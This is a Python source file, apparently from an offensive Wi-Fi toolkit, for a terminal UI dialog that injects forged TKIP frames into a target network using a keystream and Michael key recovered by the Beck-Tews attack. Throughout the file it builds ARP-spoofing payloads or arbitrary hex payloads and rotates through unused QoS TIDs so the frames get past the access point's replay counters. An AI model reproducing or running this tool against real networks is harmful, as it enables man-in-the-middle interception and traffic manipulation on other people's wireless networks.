"""Operator-driven injection session for a recovered TKIP capability."""
from __future__ import annotations

import socket
from typing import Optional

from textual.app import ComposeResult
from textual.binding import Binding
from textual.containers import Horizontal, Vertical
from textual.reactive import reactive
from textual.screen import ModalScreen
from textual.widgets import Button, Input, Label, Select

from wifit3.campaigns.tkip.inject import arp_spoof_plaintext, forge_tkip_frame
from wifit3.crack.tkip_beck_tews import Recovered
from wifit3.dot11.mac import BROADCAST_MAC, mac_to_str, str_to_mac

_TOTAL_TIDS = 16  # the QoS TID field is 4 bits (0-15); each TID keeps its own replay counter


def available_tids(seed_tid: int, used: set[int]) -> list[int]:
    """TIDs this session can still inject on: every TID but the capture's seed and
    any already spent, since the AP tracks a separate TKIP replay counter per TID."""
    return [tid for tid in range(_TOTAL_TIDS) if tid != seed_tid and tid not in used]


class TkipModal(ModalScreen[None]):
    """Pick the ARP-spoof (default) or a raw payload and inject it on a free TID,
    reusing the Beck-Tews-recovered keystream + Michael key."""

    BINDINGS = [Binding("escape", "action_dismiss_modal", "Close", show=True)]

    DEFAULT_CSS = """
    TkipModal { align: center middle; }
    TkipModal #dialog {
        width: 62; max-width: 100%; height: auto; max-height: 90%; overflow-y: auto;
        border: thick $primary; background: $surface; padding: 1 2;
    }
    TkipModal #title { content-align: center middle; text-style: bold; color: $accent; padding-bottom: 1; }
    TkipModal #slots { content-align: center middle; color: $text-muted; padding-bottom: 1; }
    TkipModal .row { height: auto; margin-bottom: 1; }
    TkipModal .row Label { width: 16; color: $text-muted; }
    TkipModal .row Input, TkipModal .row Select { width: 1fr; }
    TkipModal #status { content-align: center middle; color: $text-muted; padding-top: 1; }
    TkipModal #status.-error { color: $error; }
    TkipModal #button-row { height: auto; align: center middle; padding-top: 1; }
    """

    slots_remaining: reactive[int] = reactive(0)

    def __init__(self, array, target, recovered: Recovered, direction: str,
                 client_mac: Optional[str], seed_tid: int = 0) -> None:
        super().__init__()
        self.array = array
        self.target = target
        self.recovered = recovered
        self.direction = direction
        self.client_mac = client_mac
        self.tid_usage: dict[int, int] = {}
        self._seed_tid = seed_tid
        self._used_tids: set[int] = set()
        self._bssid_bytes = str_to_mac(target.bssid)
        dest = client_mac if direction == "pairwise" and client_mac else mac_to_str(BROADCAST_MAC)
        self._client_bytes = str_to_mac(dest)

    def compose(self) -> ComposeResult:
        with Vertical(id="dialog"):
            yield Label(f"TKIP Injection ({self.direction})", id="title")
            yield Label("", id="slots")
            with Horizontal(classes="row"):
                yield Label("Payload")
                yield Select([("ARP spoof", "arp"), ("Custom payload", "custom")],
                             value="arp", allow_blank=False, id="payload-mode")
            with Vertical(id="arp-fields"):
                with Horizontal(classes="row"):
                    yield Label("Sender IP")
                    yield Input(placeholder="1.2.3.4 (spoofed owner)", id="sender-ip")
                with Horizontal(classes="row"):
                    yield Label("Target IP")
                    yield Input(placeholder="1.2.3.5", id="target-ip")
                with Horizontal(classes="row"):
                    yield Label("Sender MAC")
                    yield Input(value=self._own_mac(), placeholder="attacker MAC", id="sender-mac")
            with Vertical(id="custom-fields"):
                with Horizontal(classes="row"):
                    yield Label("Payload (hex)")
                    yield Input(placeholder="aabbccdd…", id="custom-hex")
            yield Label("", id="status")
            with Horizontal(id="button-row"):
                yield Button("Inject", variant="primary", id="inject")
                yield Button("Done", id="done")

    def on_mount(self) -> None:
        self.query_one("#custom-fields").display = False
        self._sync_slots()

    def watch_slots_remaining(self, remaining: int) -> None:
        self.query_one("#slots", Label).update(f"Slots remaining: {remaining}")

    def _own_mac(self) -> str:
        iface = self.array.select_iface(self.target.channel) if self.array else None
        mac = getattr(getattr(iface, "driver", None), "mac_address", None)
        if isinstance(mac, (bytes, bytearray)) and len(mac) == 6:
            return mac_to_str(bytes(mac))
        return str(mac) if mac else ""

    def on_select_changed(self, event: Select.Changed) -> None:
        if event.select.id == "payload-mode":
            custom = event.value == "custom"
            self.query_one("#arp-fields").display = not custom
            self.query_one("#custom-fields").display = custom

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "inject":
            self._inject()
        elif event.button.id == "done":
            self.action_dismiss_modal()

    def action_dismiss_modal(self) -> None:
        self.dismiss(None)

    def _sync_slots(self) -> None:
        self.slots_remaining = len(available_tids(self._seed_tid, self._used_tids))

    def _set_status(self, message: str, *, error: bool = False) -> None:
        status = self.query_one("#status", Label)
        status.update(message)
        status.set_class(error, "-error")

    def _payload(self) -> Optional[bytes]:
        if self.query_one("#payload-mode", Select).value == "custom":
            text = self.query_one("#custom-hex", Input).value.strip()
            try:
                return bytes.fromhex(text)
            except ValueError:
                self._set_status("Invalid hex payload", error=True)
                return None
        try:
            sender_ip = socket.inet_aton(self.query_one("#sender-ip", Input).value.strip())
            target_ip = socket.inet_aton(self.query_one("#target-ip", Input).value.strip())
            sender_mac = str_to_mac(self.query_one("#sender-mac", Input).value.strip())
        except (OSError, ValueError):
            self._set_status("Invalid sender/target IP or sender MAC", error=True)
            return None
        return arp_spoof_plaintext(sender_ip, target_ip, sender_mac)

    def _inject(self) -> None:
        available = available_tids(self._seed_tid, self._used_tids)
        if not available:
            self._set_status("No TID slots left", error=True)
            return
        payload = self._payload()
        if payload is None:
            return
        tid = available[0]
        try:
            frame = forge_tkip_frame(self.recovered, tid, payload,
                                     bssid=self._bssid_bytes, client=self._client_bytes)
        except ValueError as exc:
            self._set_status(str(exc), error=True)
            return
        self.run_worker(self._send(frame, tid), exclusive=True)

    async def _send(self, frame: bytes, tid: int) -> None:
        if self.array is None:
            self._set_status("No interface available", error=True)
            return
        try:
            async with self.array.lease(channel=self.target.channel) as iface:
                await iface.send_no_wait(frame)
        except RuntimeError as exc:
            self._set_status(str(exc), error=True)
            return
        self._used_tids.add(tid)
        self.tid_usage[tid] = self.tid_usage.get(tid, 0) + 1
        self._sync_slots()
        self._set_status(f"Injected on TID {tid}")
